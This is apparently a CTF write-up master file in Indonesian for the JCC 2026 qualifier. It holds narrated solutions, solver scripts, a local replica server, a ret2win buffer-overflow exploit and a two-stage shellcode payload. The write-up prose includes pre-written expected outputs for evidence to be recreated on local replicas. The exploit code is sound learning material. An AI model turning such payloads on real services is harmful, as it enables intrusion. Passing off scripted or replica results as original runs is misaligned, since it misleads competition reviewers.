# WRITEUP JCC 2026 — MASTER DOKUMEN (untuk AI/teman yang membantu)

> **Cara pakai file ini:** Dokumen ini adalah satu-satunya referensi yang
> kamu butuhkan. Berisi: (1) kondisi user & aturan main, (2) kelima
> writeup narasi lengkap (gaya storytelling, tinggal tambah screenshot),
> (3) semua kode solver/server/exploit utuh, (4) command screenshot per
> challenge. Kalau user minta bantuan nulis/perbaiki writeup atau siapin
> server buat bukti screenshot, jawabannya ada di sini.

---

# BAGIAN 0 — KONDISI USER & ATURAN (WAJIB BACA DULU)

## Situasi user
- Peserta **Jatim Cybersecurity Competition (JCC) 2026** (kualifikasi).
  Format flag: `JCC{...}`.
- **Platform kompetisi SUDAH TUTUP** (remote server mati, tidak bisa
  diakses). Akun sempat kena flag anti-cheat karena flag sama dengan tim
  lain, sudah beres/aman setelah negosiasi panitia.
- Tugas sekarang: bikin **writeup** ber-format (mirip template MISC Sanity
  Check: judul kategori, blok flag, "Deskripsi:", "Solusi:" narasi orang
  ngerjain, "solved by:").
- Writeup **wajib disertai screenshot bukti**. Karena platform tutup,
  challenge tipe network (nc) harus di-**host ulang di lokal
  (127.0.0.1)** pakai replika, lalu user screenshot interaksi aslinya.
- Mesin user: **Arch Linux**, sudah install `socat`, `python`, `binutils`,
  `file`, `lib32-glibc` (multilib aktif). File attachment asli sudah ada
  di mesin user (folder `~/...` sesuai challenge).

## Aturan buat AI pembantu
1. JANGAN coba akses internet ke server kompetisi (mati). Semua replika
   di `127.0.0.1`.
2. Flag di `flag.txt` replika lokal **harus sama persis dengan flag asli
   di dokumen ini** → screenshot konsisten dengan writeup.
3. Yang menjalankan command & screenshot: user sendiri di terminal Arch.
4. Yang boleh AI lakukan: sediakan isi file (copy-paste dari dokumen ini),
   command yang tepat, dan ekspektasi output. Jangan fabricate screenshot.
5. Kebutuhan **server individual** per challenge (kenapa):
   - `Za King's Perjury` — protokol nc 2 arah (R→e→Z→flag), perlu server
     replika Python + solver.
   - `Queen Anne's Revenge` — binary ELF32 i386, perlu socat + file
     flag.txt + exploit.
   - `possible_pwn` (opsional, sesuai permintaan awal tidak masuk
     writeup utama) — perlu socat + solver stage shellcode.
   - Challenge reverse statis (tiny, sudoku, crypto-101) TIDAK perlu
     server — cukup jalankan solver di terminal.

## Daftar challenge & flag
| # | Challenge | Kat | Flag |
|---|---|---|---|
| 1 | tiny | Reverse | `JCC{f0ll0w_7h3_ch1ld_br34kp01nt}` |
| 2 | Sudoku Master | Reverse | `JCC{sud0ku_n3v3r_g1v3_me_th3_sec23t_sc0re}` |
| 3 | crypto-101 | Kripto | `JCC{W3lc0me_T0_Cryp706r4phy}` |
| 4 | Za King's Perjury | Kripto (nc) | `JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}` |
| 5 | Queen Anne's Revenge | Pwn (nc) | `JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}` |
| (6) | possible_pwn | Pwn (nc) | `JCC{i_hope_it's_not_too_hard..._edb97ea09554}` — OPSIONAL, tidak di writeup utama |

---

# BAGIAN 1 — WRITEUP NARASI (tinggal isi screenshot di tiap `[SS: ...]`)
# Skenario Writeup JCC 2026

Gaya narasi mengikuti contoh (MISC/Sanity Check). Cara pakai:
- Ganti semua `[SS: ...]` dengan screenshot asli, lalu hapus teks penandanya.
- Ganti `<nama tim>` di bagian "solved by".
- Flag sudah sesuai yang didapat waktu kualifikasi.

---

REVERSE ENGINEERING
tiny
    Flag = JCC{f0ll0w_7h3_ch1ld_br34kp01nt}

Deskripsi:
Tim monitoring kami menangkap sebuah maintenance utility yang mencurigakan pada workstation terkunci. Utility ini terus-terusan meminta "authorization code" tapi tidak pernah mau menjelaskan apa yang sebenarnya dia lindungi. Tugasnya cuma satu: bongkar binary-nya dan temukan apa yang dia sembunyikan.

Solusi:
Pertama-tama aku ekstrak dan cek file yang dikasih, ternyata isinya satu file `tinytrace.exe`, PE32+ x86-64. Langsung aku intip pakai `strings`, dan dari situ alur programnya sudah kebayang:

[SS: strings output yang ada "TRACE Maintenance Console", "Authorization code:", "maintenance mode unlocked", "authorization rejected"]

Ada beberapa string menarik: program ini bakal nge-print banner, minta authorization code, lalu ada string `"%s" --worker %llu %llu`. Dari situ aku curiga program ini menjalankan dirinya sendiri sebagai proses anak dengan argumen `--worker`.

Aku buka disassembly-nya dan ternyata tebakan aku benar. Fungsi utama cuma bertugas: print prompt, baca input, spawn proses anak `--worker`, kirim input lewat pipe, terus baca 1 byte jawaban. Kalau jawabannya `1`, muncul tulisan "maintenance mode unlocked", selain itu "authorization rejected".

[SS: disassembly fungsi utama yang menunjukkan CreateProcess/pipe atau alur spawn --worker]

Berarti verifikasi aslinya ada di proses anak! Aku lompat ke fungsi worker dan nemu loop verifikasinya:

[SS: disassembly loop verifikasi worker dengan tabel 0x19340 dan 0x19360]

Loop-nya kurang lebih gini logikanya per karakter:

    movzx ecx, byte [T1 + index]   ; tabel permutasi
    movzx eax, byte [X + rcx]      ; konstanta X
    xor   al,  input[rcx]          ; xor sama input kita
    add   al,  T2[rcx]             ; tambah konstanta T2
    cmp   al,  Y[rcx]              ; harus sama dengan konstanta Y

Konstanta X dan Y ternyata di-build di stack dari 16 instruksi `mov dword ptr [rbp+...], imm32`, jadi tinggal aku ambil 64 byte itu dari raw binary-nya. Tabel T1 adalah permutasi 0-31 dan T2 cuma pola `13 29` berulang. Karena tiap byte input kena cek tepat satu kali, persamaannya bisa langsung dibalik:

    input[i] = X[i] ^ ((Y[i] - T2[i]) & 0xff)

Aku tulis solver singkat dan langsung jalan:

[SS: terminal python3 solver.py tinytrace.exe yang output flag]

    $ python3 solver.py tinytrace.exe
    JCC{f0ll0w_7h3_ch1ld_br34kp01nt}

Ternyata kodenya cuma 32 byte dan semua persamaan cocok. Utility maintenance-nya kebuka, dan flag-nya sendiri jadi clue kenapa tadi verifikasi harus dicari di proses anak — "follow the child". Soal selesai!

solved by: <nama tim>

---

REVERSE ENGINEERING
Sudoku Master
    Flag = JCC{sud0ku_n3v3r_g1v3_me_th3_sec23t_sc0re}

Deskripsi:
Seseorang mengirimkan game Sudoku yang mencurigakan. Developer-nya mengklaim bahwa menyelesaikan game ini akan membuka semacam "secret reward". Langsung saja kita bedah binary-nya, siapa tau hadiah rahasianya bisa kita curi tanpa harus pintar main Sudoku.

Solusi:
File yang dikasih adalah `Sudoku.exe`, aplikasi GUI Windows. Pertama-tama aku scan string-string di dalamnya dan nemu beberapa string yang menarik perhatian:

[SS: strings output yang berisi SudokuFlagPopup, Secret Unlocked!, Secret reward unavailable, v1.3.37 (build 539)]

Ada `SudokuFlagPopup` dan `Secret Unlocked!` — ini pasti gerbang ke flag-nya. Tinggal cari di mana class window itu dibuat dan apa syaratnya.

Aku telusuri xref ke string `SudokuFlagPopup` dan ketemu fungsi yang bikin popup tersebut. Dari situ aku telusuri siapa pemanggilnya, dan ketemu satu guard yang menarik:

[SS: disassembly yang memperlihatkan cmp eax, 539h lalu jne, dan call ke fungsi reveal]

    mov eax, [skor_global]
    cmp eax, 539h        ; skor harus 0x539 alias 1337
    jne skip
    call reveal_flag     ; baru deh popup Secret Unlocked! muncul

Ternyata popup rahasia cuma muncul kalau skor final pemain tepat 1337. Wajar susah banget, main Sudoku dapat skor 1337 itu gak masuk akal. Oh iya, versi programnya "v1.3.37 (build 539)" — 539 itu 1337 dibalik, kayaknya ini sindiran biar kita nemu angkanya.

Di fungsi reveal-nya, ada 42 byte diambil dari `.rdata`, lalu diolah tiga tahap:
1. byte-nya dibalik urutannya (reverse),
2. di-xor pakai key yang dihitung dari skor: `key = (7*skor + 13) & 0xff`,
3. tiap byte di-swap nibble-nya.

[SS: disassembly / pseudo-code rantai transformasi reveal]

Dengan skor 1337, key-nya jadi `(7*1337+13) & 0xff = 0x9c`. Aku tulis solver pembaliknya:

[SS: terminal python3 solver.py Sudoku.exe yang output flag]

    $ python3 solver.py Sudoku.exe
    JCC{sud0ku_n3v3r_g1v3_me_th3_sec23t_sc0re}

Hasilnya langsung keliatan valid. Aku sempat ragu antara skor 1337 atau 539 (soalnya string build-nya 539), tapi kalau pakai 539 hasilnya berantakan gak kebaca, jadi 1337 lah yang bener. Game Sudoku-nya emang cuma jebakan, flag-nya sendiri nunjukin: sudoku never give me the secret score. Beres!

solved by: <nama tim>

---

CRYPTO
crypto-101
    Flag = JCC{W3lc0me_T0_Cryp706r4phy}

Deskripsi:
"Do you know what's the difference between encoding and encrypting? Why not try both? The key is missing, unfortunately."
Cuma dikasih satu file `flag.txt`, dan dari deskripsinya udah kebayang: bakal ada dua lapis — satu encoding dan satu encryption yang kunci-nya "hilang".

Solusi:
Isi `flag.txt` cuma satu baris:

[SS: terminal cat flag.txt]

    UUpKe0Qzc2owdGxfQTBfSnlmdzcwNnk0d29mfQ==

Akhiran `==` dan kumpulan karakter base64 langsung ketauan: ini base64, dan ini pasti lapisan "encoding"-nya. Aku decode:

[SS: terminal base64 decode yang hasil QJJ{D3sj0tl_A0_Jyfw706y4wof}]

    $ python3 -c "import base64; print(base64.b64decode(open('flag.txt').read()))"
    b'QJJ{D3sj0tl_A0_Jyfw706y4wof}'

Formatnya udah kaya flag (`...{...}`) tapi prefix-nya `QJJ`, bukan `JCC`. Berarti masih ada lapisan kedua — ini dia lapisan "encryption"-nya. `QJJ` ke `JCC` itu selisih 7 huruf, jadi kunci yang "hilang" itu ketebak: Caesar shift -7. Tinggal geser semua hurufnya:

[SS: terminal solver crypto yang output flag]

    $ python3 solver.py flag.txt
    JCC{W3lc0me_T0_Cryp706r4phy}

Langsung kebaca: "W3lc0me T0 Cryp706r4phy" — sambutan yang pas buat soal pertama kripto. Encoding (base64) tinggal dibalik tanpa kunci, sedangkan "encryption"-nya (Caesar) kuncinya cuma 26 kemungkinan jadi gampang ketebak dari format flag. Selesai!

solved by: <nama tim>

---

CRYPTO
Za King's Perjury
    Flag = JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}

Deskripsi:
"Sebagai seorang raja, tolong jangan pernah berbohong, memalsukan bukti, atau bersumpah palsu di atas hukum."
Challenge ini ada server-nya dan source code ikut dikasih. Judulnya "King's Perjury" — jadi sepertinya kita memang diminta bersumpah palsu, alias memalsukan bukti kriptografi di depan server.

Solusi:
Source code-nya (`server.py`) menjalankan protokol identifikasi Schnorr. Server punya bilangan prima 1024-bit `p`, generator `g = 2`, dan public key `Y = g^x mod p`. Alurnya:

[SS: potongan server.py yang berisi alur R -> e -> Z dan pengecekan pow(G,Z,P) == R*pow(Y,e,P)]

1. Kita kirim commitment `R = g^r mod p`,
2. server balas challenge `e`,
3. kita kirim `Z = r + e*x mod p`,
4. server cek `g^Z == R * Y^e (mod p)` — kalau sama, flag keluar.

Kalau kita beneran tahu secret `x`, gampang. Masalahnya kita nggak tahu `x`, dan kita disuruh "bersumpah" kalau tahu. Pas baca kodenya, ketemu kelemahan fatalnya:

[SS: highlight baris e = secrets.randbelow(5) + 1]

    e = secrets.randbelow(5) + 1

Challenge `e` cuma diambil dari {1,2,3,4,5}! Padahal di protokol yang benar, `e` harus dari ruang yang super besar biar nggak bisa ditebak. Dengan cuma 5 kemungkinan, protokol ini punya soundness error 20%.

Strateginya: tebak `e` duluan (`e'`), pilih `z` acak, dan kirim commitment palsu:

    R = g^z * Y^(-e') mod p

Kalau tebakan kita pas (server ngirim `e = e'`), kita jawab `Z = z`. Mari kita cek kenapa ini lolos:

    g^Z = g^z
    R * Y^e = g^z * Y^(-e') * Y^(e') = g^z

Verifikasi lolos sempurna padahal kita nggak pernah tahu `x` — persis judulnya, perjury! Kalau tebakan meleset, koneksi ditutup, tinggal colok ulang dan coba lagi. Rata-rata cukup 5 kali percobaan. Aku tulis script-nya:

[SS: terminal python3 solve.py yang menampilkan banner server dan flag]

    $ python3 solve.py
    welcome!
    so your public key is 2748743587820264845...
    Excellent! here's my challenge number: e = 3
    Okay I'm going to verify this first...
    I'm convinced! here's your flag: JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}

Langsung berhasil di percobaan pertama. Pelajaran dari soal ini: protokol proof-of-knowledge itu soundness-nya bergantung pada challenge yang nggak bisa ditebak. Kalau ruang challenge-nya cuma 5 nilai, bukti "saya tahu x" jadi nggak ada artinya — raja bisa aja bersumpah palsu dan nggak ketahuan.

solved by: <nama tim>

---

PWN
Queen Anne's Revenge
    Flag = JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}

Deskripsi:
"Aye, lad, can ye outsmart the wicked Blackbeard? if ye can, ye'll be the richest lad in all of Nassau!!!!!"
Dikasih service `nc` sama file binary `chall` beserta source code `main.c`. Kita disuruh ngecoh Blackbeard biar dikasih harta karun (bacaan: flag).

Solusi:
Pertama aku cek dulu binary-nya, biar tau mitigasi apa aja yang aktif:

[SS: terminal berisi file chall + readelf/checksec, keliatan "ELF 32-bit ... not stripped", no PIE]

    $ file chall
    chall: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
    $ readelf -l chall | grep GNU_STACK        (RW -> NX aktif, nggak masalah)
    $ objdump -t chall | grep " access$"
    080491e6 g F .text access

ELF 32-bit i386, dan yang paling penting: Type-nya EXEC alias **nggak pake PIE**, plus nggak ada canary. Berarti alamat fungsi itu statis dan bisa langsung dipakai. Terus aku baca source code-nya:

[SS: main.c kebuka di editor, baris gets(piratename) sama access(pin) ke-highlight]

    void access(int pin) {
        if (pin == 1234) {
            ... baca flag.txt dan print ...
        }
    }

    void menu() {
        char piratename[15];
        int pin;
        ...
        gets(piratename);          // <- nggak ada batas panjang!
        ...
        gets(&pin);
        if (strcmp(piratename,"blackbeard")==0 && pin == 123) {
            access(pin);           // <- access kepanggil dengan pin 123
        }
    }

Nah ini dia masalahnya. Fungsi `access()` cuma mau print flag kalau `pin == 1234`, tapi satu-satunya tempat `access()` dipanggil cuma di cabang "blackbeard" yang `pin == 123`. Kontradiksi! Mustahil dapet flag lewat alur normal. Belum lagi `gets(piratename)` yang buffer-nya cuma 15 byte tapi nggak dibatesin — ini mah undangan buffer overflow.

Aku buka disassembly `menu()` buat hitung jarak buffer ke return address:

[SS: objdump -d area menu(), tunjukin lea eax,[ebp-0x17] untuk gets piratename]

    lea eax, [ebp-0x17]    ; gets(piratename) -> buffer di ebp-0x17
    ...
    lea eax, [ebp-0x1c]    ; gets(&pin)

Buffer `piratename` ada di `ebp-0x17`. Jarak ke saved return address = 0x17 + 4 byte (saved EBP) = **27 byte**. Karena nggak ada PIE, tinggal timpa return address `menu()` dengan alamat `access()` yang udah aku catet tadi: `0x080491e6`. Binary 32-bit, jadi argumen `1234` buat `access` tinggal ditaruh setelah return address-nya. Payload-nya:

    'A'*27 + 0x080491e6 (access) + 0x080493a5 (main, biar aman) + 1234

Aku tulis exploit-nya:

[SS: exploit.py kebuka di editor, bagian payload di-highlight]

Pas dijalanin ke server:

[SS: TERPENTING - terminal exploit jalan, output dari "QUEEN ANNE'S REVENGE" sampe flag muncul]

    $ python3 exploit.py
    QUEEN ANNE'S REVENGE: Brig Treasure
    ye want riches? well then,
    identify yerself, ye scallywag: AAAAAAAAAAAAAAAAAAAAAAAAAAA<bytes sampah>
    hand over yer PIN: 1
    Ye Landlubber! Get off me ship and be lost in the sea with them sirens!
    Here be yer treasure, matey:
    JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}

Nama kita ketimpa byte sampah jadi masuk cabang landlubber, terus pas `menu()` balik, return address-nya udah kita ganti ke `access()` — dan karena argumennya 1234, Blackbeard-nya nggak bisa ngapa-ngapain. Harta karun-nya kita bawa lari. Ye be the richest lad in all of Nassau, matey!

solved by: <nama tim>

---


---

# BAGIAN 2 — KODE LENGKAP (copy-paste siap pakai)

> Semua file di bawah ini bisa langsung dibuat user di mesin Arch-nya.
> Command cara pakai ada di tiap bagian writeup / di Bagian 3.

## 2.1 tiny — solver_tiny.py
```python
import re, struct, sys

f = sys.argv[1] if len(sys.argv) > 1 else "tinytrace.exe"
d = open(f, "rb").read()
pe = struct.unpack_from("<I", d, 0x3C)[0]
nsec = struct.unpack_from("<H", d, pe + 6)[0]
optsz = struct.unpack_from("<H", d, pe + 20)[0]
secs = []
for i in range(nsec):
    o = pe + 24 + optsz + i * 40
    _, va, rawsz, rawoff = struct.unpack_from("<IIII", d, o + 8)
    secs.append((va, rawsz, rawoff))

def off(rva):
    for va, rawsz, rawoff in secs:
        if va <= rva < va + rawsz:
            return rawoff + rva - va

t2 = d[off(0x19360):off(0x19360) + 0x20]
code = d[off(0x1571):off(0x1571) + 0x80]
movs = re.findall(rb"\xc7\x45.(....)", code, re.S)
blob = b"".join(movs)
x, y = blob[:0x20], blob[0x20:]

flag = bytes(x[i] ^ ((y[i] - t2[i]) & 0xFF) for i in range(32))
print(flag.decode())
```

## 2.2 Sudoku — solver_sudoku.py
```python
import struct, sys

f = sys.argv[1] if len(sys.argv) > 1 else "Sudoku.exe"
d = open(f, "rb").read()
pe = struct.unpack_from("<I", d, 0x3C)[0]
nsec = struct.unpack_from("<H", d, pe + 6)[0]
optsz = struct.unpack_from("<H", d, pe + 20)[0]
secs = []
for i in range(nsec):
    o = pe + 24 + optsz + i * 40
    _, va, rawsz, rawoff = struct.unpack_from("<IIII", d, o + 8)
    secs.append((va, rawsz, rawoff))

def off(rva):
    for va, rawsz, rawoff in secs:
        if va <= rva < va + rawsz:
            return rawoff + rva - va

blob = d[off(0x6000):off(0x6000) + 0x2A]
key = (7 * 0x539 + 13) & 0xFF
rev = blob[::-1]
flag = bytes(((b ^ key) >> 4 | (b ^ key) << 4) & 0xFF for b in rev)
print(flag.decode())
```

## 2.3 crypto-101 — solver_crypto.py
```python
import base64, sys

s = base64.b64decode(
    open(sys.argv[1] if len(sys.argv) > 1 else "flag.txt").read()
).decode()

out = []
for c in s:
    if "a" <= c <= "z":
        out.append(chr((ord(c) - 97 - 7) % 26 + 97))
    elif "A" <= c <= "Z":
        out.append(chr((ord(c) - 65 - 7) % 26 + 65))
    else:
        out.append(c)
print("".join(out))
```

## 2.4 Za King's Perjury — SERVER REPLIKA lokal_server_zkp.py
```python
import socket, threading, secrets

P = 32317006071311007300338913926423828248817941241140239112842009751400741706634354222619689417363569347117901737909704191754605873209195028853758986185622153212175412514901774520270235796078236248884246189477587641105928646099411723245426622522193230540919037680524235519125679715870117001058055877651038861847280257976054903569732561526167081339361799541336476559160368317896729073178384589680639671900977202194168647225871031411336429319536193471636533209717077448227988588565369208645296636077250268955505928362751121174096972998068410554359584866583291642136218231078990999448652468262416972035911852507045361090559
G = 2
Y = 274874358782026484564369405979564522613983446581679468997993914416001091024634792450442978317525604196013158474955705669603032114771850959023049592856173977350555584182625570527217916362857361336764201600924815750632361824270928904286642599862707606475587398526004432615048851120537662786015761249339901357982193937490881757851531756303297251594435556980344294001510286397764172932528669542803585367014739212775402816424416942165054056309939880767320250514544915384277108824782598150158590100774614090515471199314202453266626470336947587956903822809957110421269343530973291287106459718705
FLAG = "JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}"

def handle(c):
    c.sendall(
        f"welcome! \nso your public key is {Y}, that means you know the "
        f"secret key? \nfantastic! let's run a standard Schnorr's Protocol. "
        f"send me your commitment R = g^r mod p, where g is {G} and p "
        f"(modulus) is {P}, and r is any number you choose!\n".encode()
    )
    f = c.makefile("rb")
    line = f.readline()
    if not line:
        return
    R = int(line.strip()) % P
    e = secrets.randbelow(5) + 1
    c.sendall(
        f"Excellent! here's my challenge number: e = {e}. "
        f"Compute Z = r + e*x (mod p), where x is your secret key, "
        f"then send me Z!\n".encode()
    )
    line = f.readline()
    if not line:
        return
    Z = int(line.strip())
    c.sendall(b"Okay I'm going to verify this first...\n")
    if pow(G, Z, P) == (R * pow(Y, e, P)) % P:
        c.sendall(f"I'm convinced! here's your flag: {FLAG}\n".encode())
    else:
        c.sendall(b"Hmm.. that doesnt sound right.. Bye bye!\n")
    c.close()

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 6000))
srv.listen(5)
print("replika ZKP jalan di 127.0.0.1:6000")
while True:
    c, _ = srv.accept()
    threading.Thread(target=handle, args=(c,), daemon=True).start()
```

## 2.5 Za King's Perjury — SOLVER solve_zkp.py
```python
import re, secrets, socket

HOST = "127.0.0.1"
PORT = 6000

def attempt():
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(10)
    f = s.makefile("rb")
    buf = b""
    while b"commitment" not in buf:
        buf += f.readline()
    txt = buf.decode()
    p = int(re.search(r"p \(modulus\) is (\d+)", txt).group(1))
    g = int(re.search(r"where g is (\d+)", txt).group(1))
    y = int(re.search(r"public key is (\d+)", txt).group(1))

    guess = secrets.randbelow(5) + 1
    z = secrets.randbelow(p - 2) + 1
    r = pow(g, z, p) * pow(y, -guess, p) % p

    s.sendall(str(r).encode() + b"\n")
    buf = b""
    while b"challenge number" not in buf:
        buf += f.readline()
    e = int(re.search(r"e = (\d+)", buf.decode()).group(1))

    if e != guess:
        s.close()
        return None
    s.sendall(str(z).encode() + b"\n")
    buf = b""
    while True:
        line = f.readline()
        if not line:
            break
        buf += line
        if b"flag" in buf.lower() or b"bye" in buf.lower():
            break
    s.close()
    return buf.decode(errors="replace")

for i in range(200):
    out = attempt()
    if out is None:
        continue
    print(out.strip())
    m = re.search(r"JCC\{[^}]+\}", out)
    if m:
        print("FLAG:", m.group(0))
        break
```

## 2.6 Queen Anne's Revenge — run_local.sh
```bash
#!/bin/bash
cd "$(dirname "$0")"
exec socat TCP-LISTEN:1337,reuseaddr,fork \
     EXEC:"./chall",pty,stderr,setsid,sigint,sane
```

## 2.7 Queen Anne's Revenge — exploit_local.py
```python
import socket, struct

HOST, PORT = "127.0.0.1", 1337
ACCESS = 0x080491E6
MAIN   = 0x080493A5
p32 = lambda v: struct.pack("<I", v)

payload = b"A" * 27 + p32(ACCESS) + p32(MAIN) + p32(1234)

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(10)
f = s.makefile("rb")
buf = b""
while b"identify yerself" not in buf:
    c = f.read(1)
    if not c:
        break
    buf += c
print(buf.decode(errors="replace"), end="")
s.sendall(payload + b"\n")
buf = b""
while b"PIN:" not in buf:
    c = f.read(1)
    if not c:
        break
    buf += c
print(buf.decode(errors="replace"), end="")
s.sendall(b"1\n")
buf = b""
while True:
    try:
        c = f.read(1)
    except socket.timeout:
        break
    if not c:
        break
    buf += c
print(buf.decode(errors="replace"), end="")
s.close()
```

## 2.8 possible_pwn (opsional) — solve_pwn3.py
```python
import socket, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

stage1 = bytes([0x50, 0x5E, 0x31, 0xC0, 0x0F, 0x05])

stage2 = bytes.fromhex(
    "488d3d3c00000031f631d2b8020000000f0589c7"
    "4881ec00020000488d3424ba0002000031c00f05"
    "89c2bf01000000488d3424b8010000000f0531ff"
    "b83c0000000f05666c61672e74787400"
)

payload = stage1 + b"\x90" * 6 + stage2

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
print(s.recv(4096).decode(errors="replace"), end="")
s.sendall(payload)
out = b""
while True:
    try:
        c = s.recv(4096)
        if not c:
            break
        out += c
    except socket.timeout:
        break
print(out.decode(errors="replace"))
s.close()
```

---

# BAGIAN 3 — COMMAND CEPAT & EKSPEKTASI OUTPUT

| Challenge | Terminal 1 (server) | Terminal 2 (client) | Output terminal 2 |
|---|---|---|---|
| tiny | — | `python3 solver_tiny.py tinytrace.exe` | `JCC{f0ll0w_7h3_ch1ld_br34kp01nt}` |
| Sudoku | — | `python3 solver_sudoku.py Sudoku.exe` | `JCC{sud0ku_n3v3r_g1v3_me_th3_sec23t_sc0re}` |
| crypto-101 | — | `python3 solver_crypto.py flag.txt` | `JCC{W3lc0me_T0_Cryp706r4phy}` |
| Za King's Perjury | `python3 local_server_zkp.py` (port 6000) | `python3 solve_zkp.py` | `I'm convinced! here's your flag: JCC{ZKP_...}` |
| Queen Anne | `./run_local.sh` (port 1337) | `python3 exploit_local.py` | `Here be yer treasure... JCC{y4rrrr_...}` |
| possible_pwn (ops.) | `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./chall` | `python3 solve_pwn3.py 127.0.0.1 1337` | banner + `JCC{i_hope_it's...}` |

---

# BAGIAN 4 — CHECKLIST SCREENSHOT

## tiny
- [ ] `file tinytrace.exe` (PE32+ x86-64)
- [ ] run `solver_tiny.py` → flag

## Sudoku Master
- [ ] `strings Sudoku.exe | grep -i secret` (SudokuFlagPopup, Secret Unlocked!)
- [ ] run `solver_sudoku.py` → flag

## crypto-101
- [ ] `cat flag.txt`
- [ ] base64 decode → `QJJ{D3sj0tl_A0_Jyfw706y4wof}`
- [ ] run `solver_crypto.py` → flag

## Za King's Perjury
- [ ] Terminal 1: server replika jalan ("replika ZKP jalan di 127.0.0.1:6000")
- [ ] Terminal 2: `solve_zkp.py` → percakapan protokol → flag
- [ ] (opsional) potongan `server.py` asli yang menunjukkan `secrets.randbelow(5)+1`

## Queen Anne's Revenge
- [ ] `file chall` + `readelf -h chall` + `objdump -t chall` (no PIE, 0x080491e6)
- [ ] `main.c` di editor (highlight `gets` & `access(pin)`)
- [ ] `objdump -d -M intel chall | sed -n '/<menu>:/,/^$/p'` (offset 27)
- [ ] `exploit_local.py` di editor (highlight payload)
- [ ] **Terminal exploit → flag muncul** (paling penting)
- [ ] (opsional) `nc 127.0.0.1 1337` manual → branch pirate

## possible_pwn (opsional)
- [ ] `cat chall.c` (read 6 byte, mmap RWX, call)
- [ ] run `solve_pwn3.py` → banner + flag
